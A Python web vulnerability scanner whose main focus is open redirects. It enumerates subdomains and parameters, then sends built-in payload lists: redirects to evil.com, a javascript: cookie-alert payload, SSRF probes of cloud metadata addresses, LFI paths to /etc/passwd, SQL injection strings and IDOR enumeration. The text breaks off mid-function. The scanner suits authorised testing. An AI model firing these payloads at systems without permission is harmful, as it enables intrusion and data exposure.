#!/usr/bin/env python3
# Author: Jass 

import requests
import argparse
import sys
import urllib.parse
import csv
import json
from datetime import datetime
from termcolor import colored
from urllib3.exceptions import InsecureRequestWarning
from playwright.async_api import async_playwright
import dns.resolver
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import re
import logging
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

# --- ASCII Banner ---
CUSTOM_BANNER = r"""


 _______                      ______            _ _                             ______                                     
(_______)                    (_____ \          | (_)                    _      / _____)                                    
 _     _ ____  _____ ____     _____) )_____  __| |_  ____ _____  ____ _| |_   ( (____   ____ _____ ____  ____  _____  ____ 
| |   | |  _ \| ___ |  _ \   |  __  /| ___ |/ _  | |/ ___) ___ |/ ___|_   _)   \____ \ / ___|____ |  _ \|  _ \| ___ |/ ___)
| |___| | |_| | ____| | | |  | |  \ \| ____( (_| | | |   | ____( (___  | |_    _____) | (___/ ___ | | | | | | | ____| |    
 \_____/|  __/|_____)_| |_|  |_|   |_|_____)\____|_|_|   |_____)\____)  \__)  (______/ \____)_____|_| |_|_| |_|_____)_|    
        |_|                                                                                                                
                                                                                      
"""

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[logging.FileHandler(f"scan_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")]
)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Default params and payloads
default_params = ["next", "url", "redirect", "return", "to", "continue", "dest", "path", "redirect_uri", "return_url", "window", "link"]
default_payloads = [
    "//evil.com",
    "https://evil.com",
    "//attacker.com",
    "javascript://%250aalert(document.cookie)",
    "//malicious.com/%2F..",
    "data://text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",
    "//google.com",
    "/%09/evil.com",
    "/\\evil.com",
    "///evil.com"
]
common_subdomains = ["www", "mail", "api", "app", "login", "accounts", "drive", "blog", "shop", "dev", "test", "admin"]

# Additional payloads for new checks
REFLECT_PAYLOADS = ["reflect_test_12345"]
SSRF_PAYLOADS = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\Windows\\win.ini"]
SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1'--"]
IDOR_RANGE = range(1, 6)

# Global lists for results
dns_cache = {}
vuln_table = []
takeover_results = []
csp_iframe_results = []
param_results = []
found_reflections = []
found_ssrf = []
found_lfi = []
found_sqli = []
found_idor = []

# Thread locks
dns_lock = threading.Lock()
takeover_lock = threading.Lock()
params_lock = threading.Lock()
vuln_table_lock = threading.Lock()
csp_iframe_results_lock = threading.Lock()

# Semaphores
HTTP_SEMAPHORE = None
BROWSER_SEMAPHORE = None
VULN_SEMAPHORE = asyncio.Semaphore(10)

def display_banner():
    print(colored(CUSTOM_BANNER, "cyan", attrs=["bold"]))
    print(colored("          Open Redirect Scanner v3.9 ~ Powered by Jass          ", "cyan", attrs=["bold"]))
    
    print(colored("================================================================", "cyan"))

def print_ui_message(message, prefix="🔍", color="cyan", attrs=[], is_silent=False):
    if not is_silent:
        print(colored(f"{prefix} {message}", color, attrs=attrs))

# --- Vulnerability Checks ---
async def check_reflection(session, url, param, semaphore, results_list):
    test_payload = "reflect_test_12345"
    test_url = update_url_param(url, param, [test_payload])
    async with semaphore:
        try:
            async with session.get(test_url, ssl=False, timeout=10) as resp:
                text = await resp.text()
                if test_payload in text:
                    results_list.append({
                        "url": url,
                        "param": param,
                        "type": "reflected_param",
                        "severity": "Low"
                    })
        except:
            pass

async def check_ssrf(session, url, param, semaphore, results_list):
    for payload in SSRF_PAYLOADS:
        test_url = update_url_param(url, param, [payload])
        async with semaphore:
            try:
                async with session.get(test_url, ssl=False, timeout=10) as resp:
                    if resp.status in [200, 302]:
                        results_list.append({
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "type": "ssrf",
                            "severity": "High"
                        })
            except:
                continue

async def check_lfi(session, url, param, semaphore, results_list):
    for payload in LFI_PAYLOADS:
        test_url = update_url_param(url, param, [payload])
        async with semaphore:
            try:
                async with session.get(test_url, ssl=False, timeout=10) as resp:
                    text = await resp.text()
                    if "root:x" in text or "[extensions]" in text:
                        results_list.append({
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "type": "lfi",
                            "severity": "Critical"
                        })
            except:
                continue

async def check_sqli(session, url, param, semaphore, results_list):
    for payload in SQLI_PAYLOADS:
        test_url = update_url_param(url, param, [payload])
        async with semaphore:
            try:
                async with session.get(test_url, ssl=False, timeout=10) as resp:
                    text = await resp.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "unclosed quotation"]):
                        results_list.append({
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "type": "sqli",
                            "severity": "Critical"
                        })
            except:
                continue

async def check_idor(session, url, semaphore, results_list):
    parsed = urllib.parse.urlparse(url)
    if "id=" not in parsed.query:
        return
    base = url.split("id=")[0]
    for i in IDOR_RANGE:
        test_url = f"{base}id={i}"
        async with semaphore:
            try:
                async with session.get(test_url, ssl=False, timeout=10) as resp:
                    body = await resp.text()
                    results_list.append({
                        "url": test_url,
                        "length": len(body),
                        "type": "idor",
                        "severity": "Medium"
                    })
            except:
                continue

def update_url_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    query[param] = value
    new_query = urllib.parse.urlencode(query, doseq=True)
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

# --- Existing Functions (unchanged) ---
def check_subdomain_takeover_fingerprint(domain, debug=False, timeout=10):
    try:
        req_session = requests.Session()
        req_session.mount("https://", requests.adapters.HTTPAdapter(max_retries=3))
        req_session.mount("http://", requests.adapters.HTTPAdapter(max_retries=3))
        response = req_session.get(f"http://{domain}", timeout=timeout, verify=False, allow_redirects=True)
        response_text = response.text.lower()
        for service, fingerprints in TAKEOVER_FINGERPRINTS.items():
            for fp in fingerprints:
                if fp.lower() in response_text:
                    if debug:
                        logging.debug(colored(f"Subdomain takeover fingerprint for {domain}: {service} ({fp})", "red"))
                    return service
    except requests.exceptions.RequestException as e:
        if debug:
            logging.debug(colored(f"Error checking takeover fingerprint for {domain}: {e}", "magenta"))
    return None

def run_subfinder(domain, output_file, debug=False):
    for attempt in range(3):
        try:
            cmd = ["subfinder", "-d", domain, "-silent", "-o", output_file]
            subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=60)
            with open(output_file, 'r') as f:
                subdomains = [f"https://{line.strip()}" for line in f if line.strip() and line.strip() != domain]
            if debug:
                logging.debug(colored(f"Subfinder success for {domain}: {len(subdomains)} subdomains", "blue"))
            return subdomains
        except subprocess.CalledProcessError as e:
            logging.error(colored(f"⚠️ Subfinder command failed for {domain} (attempt {attempt+1}): {e.stderr.strip()}", "magenta", attrs=["bold"]))
        except subprocess.TimeoutExpired:
            logging.error(colored(f"⚠️ Subfinder timed out for {domain} (attempt {attempt+1})", "magenta", attrs=["bold"]))
        except Exception as e:
            logging.error(colored(f"⚠️ Subfinder attempt {attempt+1} failed for {domain}: {e}", "magenta", attrs=["bold"]))
        if attempt < 2:
            time.sleep(2)
    return []

def crawl_urls(domain, debug=False):
    for attempt in range(3):
        try:
            cmd = ["waybackurls", domain]
            output = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=60)
            urls = [url for url in output.stdout.splitlines() if url.startswith(("http://", "https://"))]
            if debug:
                logging.debug(colored(f"Waybackurls success for {domain}: {len(urls)} URLs", "blue"))
            return urls
        except subprocess.CalledProcessError as e:
            logging.error(colored(f"⚠️ Waybackurls command failed for {domain} (attempt {attempt+1}): {e.stderr.strip()}", "magenta", attrs=["bold"]))
        except subprocess.TimeoutExpired:
            logging.error(colored(f"⚠️ Waybackurls timed out for {domain} (attempt {attempt+1})", "magenta", attrs=["bold"]))
        except Exception as e:
            logging.error(colored(f"⚠️ Waybackurls attempt {attempt+1} failed for {domain}: {e}", "magenta", attrs=["bold"]))
        if attempt < 2:
            time.sleep(2)
    return []

def extract_params(urls, debug=False):
    params = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        params.update(query_params.keys())
    if debug and params:
        logging.debug(colored(f"Extracted {len(params)} params: {', '.join(params)}", "blue"))
    return list(params)

def get_subdomains(domain, debug=False):
    with dns_lock:
        if domain in dns_cache:
            if debug:
                logging.debug(colored(f"Using cached subdomains for {domain}", "blue"))
            return dns_cache[domain]

    subdomains = []
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    subfinder_output = f"subfinder_output_{domain.replace('.', '_')}_{timestamp}.txt"
    subdomains.extend(run_subfinder(domain, subfinder_output, debug))
    if os.path.exists(subfinder_output):
        try:
            os.remove(subfinder_output)
        except OSError as e:
            logging.warning(colored(f"⚠️ Could not remove temporary file {subfinder_output}: {e}", "yellow"))
    
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 5
    for sub in common_subdomains:
        try:
            test_domain = f"{sub}.{domain}"
            answers = resolver.resolve(test_domain, 'A')
            for rdata in answers:
                if not re.match(r'^\d+\.\d+\.\d+\.\d+$', str(rdata)):
                    subdomains.append(f"https://{test_domain}")
        except dns.resolver.NXDOMAIN:
            continue
        except dns.resolver.NoAnswer:
            continue
        except dns.exception.Timeout:
            if debug:
                logging.debug(colored(f"DNS query timed out for {test_domain}", "yellow"))
            continue
        except Exception as e:
            if debug:
                logging.debug(colored(f"Error resolving {test_domain}: {e}", "magenta"))
            continue
    
    try:
        answers = resolver.resolve(f"*.{domain}", 'CNAME')
        for rdata in answers:
            subdomain = str(rdata).rstrip('.')
            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', subdomain) and not subdomain.endswith(domain):
                subdomains.append(f"https://{subdomain}")
    except dns.resolver.NXDOMAIN:
        pass
    except dns.resolver.NoAnswer:
        pass
    except dns.exception.Timeout:
        if debug:
            logging.debug(colored(f"DNS query timed out for *. {domain}", "yellow"))
    except Exception as e:
        if debug:
            logging.debug(colored(f"Error resolving *. {domain}: {e}", "magenta"))

    subdomains = list(set(subdomains))
    with dns_lock:
        dns_cache[domain] = subdomains
    if debug:
        logging.debug(colored(f"Total subdomains for {domain}: {len(subdomains)}", "blue"))
    return subdomains

def check_subdomain_takeover(domain, debug=False, timeout=10):
    potential_takeover_service = None
    try:
        answers = dns.resolver.resolve(domain, 'CNAME')
        for rdata in answers:
            cname_target = str(rdata).lower()
            if any(svc in cname_target for svc in ["amazonaws.com", "azurewebsites.net", "herokudns.com", "github.io", "cloudapp.net", "s3-website", "wpengine.com", "netlify.com", "surge.sh", "cloudfront.net", "readthedocs.io", "modulus.io", "unbouncepages.com"]):
                potential_takeover_service = "CNAME Match"
                break
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
        pass
    except Exception as e:
        if debug:
            logging.debug(colored(f"Error checking CNAME for {domain}: {e}", "magenta"))

    if potential_takeover_service:
        service_fingerprint_match = check_subdomain_takeover_fingerprint(domain, debug, timeout)
        if service_fingerprint_match:
            if debug:
                logging.debug(colored(f"Confirmed takeover for {domain} via {service_fingerprint_match} fingerprint", "red"))
            return {"domain": domain, "cname": cname_target, "takeover": f"Confirmed via {service_fingerprint_match}"}
        else:
            if debug:
                logging.debug(colored(f"CNAME matched for {domain} but no known fingerprint found. Might be legitimate or new service.", "yellow"))
            return {"domain": domain, "cname": cname_target, "takeover": "Potential (No Fingerprint Match)"}
    return None

def check_csp_headers(response):
    csp = response.headers.get('Content-Security-Policy', '')
    if not csp:
        return colored("No CSP header", "yellow", attrs=["bold"])
    weak_directives = ['unsafe-inline', 'unsafe-eval', '*']
    for directive in weak_directives:
        if directive in csp:
            return colored(f"Weak CSP: {directive}", "red", attrs=["bold"])
    return colored("Strong CSP", "green", attrs=["bold"])

def check_iframe_oauth(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    iframes = soup.find_all('iframe')
    if iframes:
        return colored(f"IFRAME: {len(iframes)} found", "yellow", attrs=["bold"])
    oauth_patterns = re.search(r'(access_token=|code=)', response_text)
    if oauth_patterns:
        return colored("OAuth token leak", "red", attrs=["bold"])
    return colored("No IFRAME/OAuth issues", "green", attrs=["bold"])

async def check_response_body_for_js_redirects(response_text, expected_malicious_domains, debug=False):
    soup = BeautifulSoup(response_text, 'html.parser')
    meta_refresh = soup.find("meta", attrs={"http-equiv": "refresh"})
    if meta_refresh and meta_refresh.get("content"):
        content = meta_refresh["content"]
        match = re.search(r"url=(['\"]?)(.*?)\1", content, re.IGNORECASE)
        if match:
            redirect_url = match.group(2)
            parsed_redirect_netloc = urllib.parse.urlparse(redirect_url).netloc.lower()
            for domain in expected_malicious_domains:
                if parsed_redirect_netloc == domain or parsed_redirect_netloc.endswith("." + domain):
                    if debug:
                        logging.debug(f"JS Redirect via meta refresh to malicious domain: {redirect_url}")
                    return redirect_url
    
    script_tags = soup.find_all("script")
    for script in script_tags:
        if script.string:
            js_code = script.string
            js_patterns = [
                r"window\.location\.href\s*=\s*['\"](.*?)['\"]",
                r"window\.location\.assign\s*\(\s*['\"](.*?)['\"]\s*\)",
                r"window\.location\.replace\s*\(\s*['\"](.*?)['\"]\s*\)",
                r"window\.open\s*\(\s*['\"](.*?)['\"]",
                r"document\.location\s*=\s*['\"](.*?)['\"]",
                r"location\.href\s*=\s*['\"](.*?)['\"]"
            ]
            for pattern in js_patterns:
                match = re.search(pattern, js_code)
                if match:
                    redirect_url = match.group(1)
                    parsed_redirect_netloc = urllib.parse.urlparse(redirect_url).netloc.lower()
                    for domain in expected_malicious_domains:
                        if parsed_redirect_netloc == domain or parsed_redirect_netloc.endswith("." + domain):
                            if debug:
                                logging.debug(f"JS Redirect via script tag to malicious domain: {redirect_url}")
                            return redirect_url
    return None

async def curl_confirm_final_redirect_to_malicious_domain(url, expected_malicious_domains, debug=False, timeout=15):
    try:
        process = await asyncio.create_subprocess_exec(
            "curl", "-s", "-L", "-w", "%{url_effective}", "-o", "/dev/null", url,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            limit=timeout
        )
        stdout, stderr = await process.communicate()
        final_url_effective = stdout.decode('utf-8').strip()
        if debug:
            logging.debug(f"cURL final effective URL for {url}: {final_url_effective}")
        final_netloc = urllib.parse.urlparse(final_url_effective).netloc.lower()
        for domain in expected_malicious_domains:
            if final_netloc == domain or final_netloc.endswith("." + domain):
                return final_url_effective, f"curl -s -L -w \"%{url_effective}\" -o /dev/null {url}"
        return None, None
    except FileNotFoundError:
        logging.error(colored("⚠️ 'curl' command not found. Please install curl to enable accurate redirect confirmation.", "red", attrs=["bold"]))
        return None, None
    except asyncio.TimeoutError:
        if debug:
            logging.debug(colored(f"cURL command timed out for {url}", "yellow"))
        return None, None
    except Exception as e:
        if debug:
            logging.debug(colored(f"Error during cURL final URL check for {url}: {e}", "magenta"))
        return None, None

async def scan_url(url, param, payload, csp_iframe_only=False, debug=False, request_timeout=15):
    result = {
        "target": url, "param": param, "payload": payload, "vulnerable_url": "",
        "location_header": "", "severity": "", "csp": "", "iframe_oauth": "",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "curl_confirmed_redirect_url": "", "curl_command": ""
    }
    
    async with HTTP_SEMAPHORE:
        try:
            parsed = urllib.parse.urlparse(url)
            if not parsed.scheme.startswith("http"):
                if debug:
                    logging.debug(colored(f"SKIPPED: {url} (invalid scheme)", "yellow"))
                return None

            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            test_url = url
            if not csp_iframe_only and param and payload:
                q = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                q[param] = [payload]
                new_query = urllib.parse.urlencode(q, doseq=True)
                test_url = f"{base}?{new_query}"
            elif not csp_iframe_only:
                if debug:
                    logging.debug(colored(f"SKIPPED: {url} (no param/payload for redirect scan)", "yellow"))
                return None

            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=request_timeout)) as session:
                async with session.get(test_url, allow_redirects=False, ssl=False) as response:
                    response_text = await response.text()
                    
                    result["csp"] = check_csp_headers(response)
                    result["iframe_oauth"] = check_iframe_oauth(response_text)
                    result["status"] = response.status
                    result["location_header"] = response.headers.get("Location", "")

                    if csp_iframe_only:
                        if "Weak CSP" in result["csp"] or "OAuth token leak" in result["iframe_oauth"] or "IFRAME:" in result["iframe_oauth"]:
                            with csp_iframe_results_lock:
                                csp_iframe_results.append({
                                    "target": url,
                                    "csp": result["csp"],
                                    "iframe_oauth": result["iframe_oauth"],
                                    "timestamp": result["timestamp"]
                                })
                        if debug:
                            logging.debug(colored(f"CSP/IFRAME scan for {url}: CSP={result['csp']}, IFRAME/OAuth={result['iframe_oauth']}", "blue"))
                        return None

                    else:
                        is_vulnerable = False
                        severity_str = "Low"
                        js_alert_detected = False

                        expected_malicious_domains = set()
                        for base_mal_domain in ["evil.com", "attacker.com"]:
                            expected_malicious_domains.add(base_mal_domain)
                        payload_netloc = urllib.parse.urlparse(payload).netloc.lower()
                        if payload_netloc:
                            expected_malicious_domains.add(payload_netloc)
                        
                        if payload and payload.startswith("javascript:"):
                            severity_str = "Critical"
                            try:
                                async with BROWSER_SEMAPHORE:
                                    async with async_playwright() as p:
                                        browser = await p.chromium.launch(headless=True)
                                        page = await browser.new_page()
                                        async def handle_dialog(dialog):
                                            nonlocal js_alert_detected
                                            js_alert_detected = True
                                            await dialog.dismiss()
                                        page.on("dialog", handle_dialog)
                                        try:
                                            await page.goto(test_url, timeout=30000)
                                        except Exception as e:
                                            if debug:
                                                logging.debug(colored(f"Playwright navigation failed for {test_url}: {e}", "magenta"))
                                        finally:
                                            await browser.close()
                                if js_alert_detected:
                                    is_vulnerable = True
                                    if debug:
                                        logging.debug(colored(f"POP CONFIRMATION: JS executed on {test_url}", "red"))
                            except Exception as e:
                                logging.error(colored(f"⚠️ Playwright setup/run failed for {test_url}: {e}", "magenta", attrs=["bold"]))
                                if debug:
                                    logging.debug(colored(f"Playwright error for {test_url}: {e}", "magenta"))
                        
                        elif result["location_header"]:
                            confirmed_final_redirect_url, curl_cmd = await curl_confirm_final_redirect_to_malicious_domain(test_url, expected_malicious_domains, debug, request_timeout)
                            if confirmed_final_redirect_url:
                                is_vulnerable = True
                                result["curl_confirmed_redirect_url"] = confirmed_final_redirect_url
                                result["curl_command"] = curl_cmd
                                if "evil.com" in payload or "attacker.com" in payload:
                                    severity_str = "Medium"
                                elif "data:" in payload:
                                    severity_str = "Low"
                            else:
                                if debug:
                                    logging.debug(colored(f"cURL did not confirm a redirect to an explicitly malicious domain ({expected_malicious_domains}) for {test_url}.", "yellow"))
                        
                        if not is_vulnerable and not payload.startswith("javascript:"):
                            js_body_redirect_url = await check_response_body_for_js_redirects(response_text, expected_malicious_domains, debug)
                            if js_body_redirect_url:
                                is_vulnerable = True
                                severity_str = "Medium"
                                result["curl_confirmed_redirect_url"] = f"JS Body Redirect: {js_body_redirect_url}"
                                result["curl_command"] = f"curl -s -L -w \"%{url_effective}\" -o /dev/null {test_url}"

                        if is_vulnerable:
                            with vuln_table_lock:
                                vuln_table.append({
                                    "target": url,
                                    "param": param,
                                    "payload": payload,
                                    "vulnerable_url": test_url,
                                    "location_header": result["location_header"],
                                    "severity": severity_str,
                                    "curl_confirmed_redirect_url": result["curl_confirmed_redirect_url"],
                                    "curl_command": result["curl_command"],
                                    "csp": result["csp"],
                                    "iframe_oauth": result["iframe_oauth"],
                                })
                            if debug:
                                logging.debug(colored(f"Vuln found for {url}: Param={param}, Payload={payload}, Location={result['location_header']}", "green"))
                            return result
                        else:
                            if debug:
                                logging.debug(colored(f"Safe/No confirmed vulnerability: {url} [param: {param}, payload: {payload}]", "green"))
                            return None

        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logging.error(colored(f"⚠️ HTTP ERROR: {url} - {e}", "magenta", attrs=["bold"]))
            if debug:
                logging.debug(colored(f"HTTP error for {url}: {e}", "magenta"))
            return None
        except Exception as e:
            logging.error(colored(f"⚠️ UNEXPECTED ERROR during scan_url for {url}: {e}", "magenta", attrs=["bold"]))
            if debug:
                logging.debug(colored(f"Unexpected error for {url}: {e}", "magenta"))
            return None

async def worker(url, params, payloads, csp_iframe_only=False, enable_reflect=False, enable_ssrf=False, enable_lfi=False, enable_sqli=False, enable_idor=False, debug=False, request_timeout=15):
    tasks = []
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=request_timeout)) as session:
        if csp_iframe_only:
            tasks.append(scan_url(url, None, None, csp_iframe_only=True, debug=debug, request_timeout=request_timeout))
        else:
            for param in params:
                for payload in payloads:
                    tasks.append(scan_url(url, param, payload, debug=debug, request_timeout=request_timeout))
                if enable_reflect:
                    tasks.append(check_reflection(session, url, param, VULN_SEMAPHORE, found_reflections))
                if enable_ssrf:
                    tasks.append(check_ssrf(session, url, param, VULN_SEMAPHORE, found_ssrf))
                if enable_lfi:
                    tasks.append(check_lfi(session, url, param, VULN_SEMAPHORE, found_lfi))
                if enable_sqli:
                    tasks.append(check_sqli(session, url, param, VULN_SEMAPHORE, found_sqli))
            if enable_idor:
                tasks.append(check_idor(session, url, VULN_SEMAPHORE, found_idor))
    
    results_from_worker = await asyncio.gather(*tasks, return_exceptions=True)
    return [res for res in results_from_worker if isinstance(res, dict)]

async def scan_targets(targets, params, payloads, max_concurrent, csp_iframe_only=False, enable_reflect=False, enable_ssrf=False, enable_lfi=False, enable_sqli=False, enable_idor=False, debug=False, request_timeout=15, is_silent=False):
    semaphore = asyncio.Semaphore(max_concurrent)
    all_scan_results = []
    for i, target in enumerate(targets, 1):
        print_ui_message(f"Scanning target {i}/{len(targets)}: {target}", prefix="🔍", color="cyan", attrs=["bold"], is_silent=is_silent)
        
        current_params = list(params)
        found_target_params = []
        for entry in param_results:
            try:
                u, p_list, _ = entry  # Handle new format: [url, params, timeout]
                if u == target:
                    found_target_params = p_list
            except ValueError:
                try:
                    u, p_list = entry  # Handle old format: [url, params]
                    if u == target:
                        found_target_params = p_list
                except ValueError:
                    if debug:
                        logging.debug(colored(f"Invalid param_results entry for {target}: {entry}", "magenta"))
                    continue
        if found_target_params:
            with params_lock:
                current_params = list(set(current_params + found_target_params))
            if debug:
                logging.debug(colored(f"Using auto-detected and default params for {target}: {', '.join(current_params)}", "blue"))
        
        if not current_params and not csp_iframe_only:
            logging.warning(colored(f"⚠️ SKIPPED: {target} (no parameters found/provided for scan)", "yellow"))
            continue

        target_results = await worker(target, current_params, payloads, csp_iframe_only, enable_reflect, enable_ssrf, enable_lfi, enable_sqli, enable_idor, debug, request_timeout)
        all_scan_results.extend(target_results)
    
    return all_scan_results

def process_file(file_path, debug=False):
    try:
        with open(file_path, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        if debug:
            logging.debug(colored(f"Read {len(lines)} lines from {file_path}", "blue"))
        return lines
    except Exception as e:
        logging.error(colored(f"⚠️ File error processing {file_path}: {e}", "magenta", attrs=["bold"]))
        if debug:
            logging.debug(colored(f"File read failed for {file_path}: {e}", "magenta"))
        return []

def print_summary(args):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    any_printed_results = False

    print("\n" + colored("┌" + "─" * 50 + "┐", "cyan"))
    print(colored("│ 📝 Scan Summary Report                        │", "cyan", attrs=["bold"]))
    print(colored("└" + "─" * 50 + "┘", "cyan"))

    if args.subdomains and dns_cache:
        all_subdomains = []
        for domain_key in dns_cache:
            all_subdomains.extend(dns_cache[domain_key])
        all_subdomains = list(set(all_subdomains))
        if all_subdomains:
            fname = f"subdomains_{timestamp}.txt"
            try:
                with open(fname, "w") as f:
                    f.write("\n".join(all_subdomains))
                print(colored(f"📁 Discovered subdomains saved to {fname}", "blue", attrs=["bold"]))
            except IOError as e:
                logging.error(colored(f"⚠️ Error saving subdomains to file {fname}: {e}", "red"))
            any_printed_results = True

    if args.auto_params and param_results:
        print(colored("\n🔍 Extracted Parameters:", "blue", attrs=["bold"]))
        for entry in param_results:
            try:
                url, params, _ = entry
            except ValueError:
                url, params = entry
            print(f"- URL: {url}")
            print(f"  Parameters: {', '.join(params)}")
        fname = f"params_{timestamp}.txt"
        try:
            with open(fname, "w") as f:
                for entry in param_results:
                    try:
                        url, params, _ = entry
                    except ValueError:
                        url, params = entry
                    f.write(f"URL: {url}, Params: {', '.join(params)}\n")
            print(colored(f"📁 Extracted parameters saved to {fname}", "blue", attrs=["bold"]))
        except IOError as e:
            logging.error(colored(f"⚠️ Error saving parameters to file {fname}: {e}", "red"))
        any_printed_results = True

    if args.takeover and takeover_results:
        print(colored("\n⚠️ Subdomain Takeover Results:", "red", attrs=["bold"]))
        for r in takeover_results:
            print(f"- Domain: {r['domain']}")
            print(f"  CNAME: {r['cname']}")
            print(f"  Status: {r['takeover']}")
        fname = f"takeover_{timestamp}.txt"
        try:
            with open(fname, "w") as f:
                for r in takeover_results:
                    f.write(f"{r['domain']} -> {r['cname']} ({r['takeover']})\n")
            print(colored(f"📁 Subdomain takeover results saved to {fname}", "blue", attrs=["bold"]))
        except IOError as e:
            logging.error(colored(f"⚠️ Error saving takeover results to file {fname}: {e}", "red"))
        any_printed_results = True

    if args.csp_iframe and csp_iframe_results:
        if csp_iframe_results:
            print(colored("\n🔍 CSP/IFRAME Check Results (Issues Found):", "blue", attrs=["bold"]))
            for r in csp_iframe_results:
                print(f"- Target: {r['target']}")
                print(f"  CSP Status: {r['csp']}")
                print(f"  IFRAME/OAuth Status: {r['iframe_oauth']}")
                print("-" * 50)
            fname = f"csp_iframe_{timestamp}.txt"
            try:
                with open(fname, "w") as f:
                    for r in csp_iframe_results:
                        f.write(f"Target: {r['target']}, CSP: {r['csp']}, IFRAME/OAuth: {r['iframe_oauth']}, Time: {r['timestamp']}\n")
                print(colored(f"📁 CSP/IFRAME results saved to {fname}", "blue", attrs=["bold"]))
            except IOError as e:
                logging.error(colored(f"⚠️ Error saving CSP/IFRAME results to file {fname}: {e}", "red"))
            any_printed_results = True
        else:
            print(colored("\n🚫 No CSP/IFRAME issues found.", "green", attrs=["bold"]))
            any_printed_results = True

    all_vulns = found_reflections + found_ssrf + found_lfi + found_sqli + found_idor
    if all_vulns and (args.enable_reflect or args.enable_ssrf or args.enable_lfi or args.enable_sqli or args.enable_idor or args.full_coverage):
        print(colored("\n📊 Additional Vulnerabilities Found:", "red", attrs=["bold"]))
        for vuln in all_vulns:
            print(f"- Type: {vuln['type'].upper()}")
            print(f"  URL: {vuln['url']}")
            if 'param' in vuln:
                print(f"  Parameter: {vuln['param']}")
            if 'payload' in vuln:
                print(f"  Payload: {vuln['payload']}")
            if 'length' in vuln:
                print(f"  Response Length: {vuln['length']}")
            severity_color = "red" if vuln['severity'] == "Critical" else \
                            "yellow" if vuln['severity'] == "High" else \
                            "cyan" if vuln['severity'] == "Medium" else "green"
            print(f"  Severity: {colored(vuln['severity'], severity_color, attrs=['bold'])}")
            print(f"  Steps to Reproduce:")
            print(f"    1. Visit {vuln['url']}{'?'+vuln['param']+'='+vuln['payload'] if 'param' in vuln and 'payload' in vuln else ''}")
            print(f"    2. Check for {'response data' if vuln['type'] in ['ssrf', 'lfi', 'sqli'] else 'IDOR behavior'}")
            print(f"    3. Run: curl -s -L {vuln['url']}{'?'+vuln['param']+'='+vuln['payload'] if 'param' in vuln and 'payload' in vuln else ''}")
            print("-" * 50)
        any_printed_results = True

        stats = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
        for vuln in all_vulns:
            stats[vuln['severity']] += 1
        print(colored("\n📈 Additional Vulnerability Stats:", "blue", attrs=["bold"]))
        for sev, count in stats.items():
            color = "red" if sev == "Critical" else "yellow" if sev == "High" else "cyan" if sev == "Medium" else "green"
            print(f"  {colored(sev + ':', color)} {count}")
        any_printed_results = True

    if (args.scan_redirect or args.full_coverage):
        filtered_vulns = vuln_table
        if args.filter_severity:
            filter_levels = args.filter_severity.split(',')
            filtered_vulns = [v for v in vuln_table if v['severity'].lower() in filter_levels]
        
        if args.sort_by == 'severity':
            severity_order = {"Critical": 3, "Medium": 2, "Low": 1}
            filtered_vulns.sort(key=lambda x: severity_order.get(x['severity'], 0), reverse=True)
        elif args.sort_by == 'url':
            filtered_vulns.sort(key=lambda x: x['target'])
        elif args.sort_by == 'param':
            filtered_vulns.sort(key=lambda x: x['param'])

        if filtered_vulns:
            print(colored("\n📊 Open Redirect Vulnerabilities Found:", "red", attrs=["bold"]))
            for entry in filtered_vulns:
                print(f"- Target: {entry['target']}")
                print(f"  Parameter: {entry['param']}")
                print(f"  Payload: {entry['payload']}")
                print(f"  Vulnerable URL: {entry['vulnerable_url']}")
                print(f"  Location Header: {entry['location_header']}")
                if entry['curl_confirmed_redirect_url']:
                    print(colored(f"  cURL Verification: {entry['curl_command']}", "green"))
                    print(colored(f"  cURL Result: {entry['curl_confirmed_redirect_url']} [CONFIRMED]", "green"))
                else:
                    print(f"  cURL Verification: Not confirmed to malicious payload.")
                severity_color = "red" if entry['severity'] == "Critical" else \
                                "yellow" if entry['severity'] == "Medium" else "cyan"
                print(f"  Severity: {colored(entry['severity'], severity_color, attrs=['bold'])}")
                print(f"  Steps to Reproduce:")
                print(f"    1. Visit {entry['vulnerable_url']}")
                print(f"    2. Observe redirect to {entry['location_header']}")
                if entry['curl_command']:
                    print(f"    3. Run: {entry['curl_command']}")
                print("-" * 50)
            any_printed_results = True
        
        if vuln_table:
            stats = {"Critical": 0, "Medium": 0, "Low": 0}
            for row in vuln_table:
                stats[row['severity']] += 1
            print(colored("\n📈 Open Redirect Vulnerability Stats:", "blue", attrs=["bold"]))
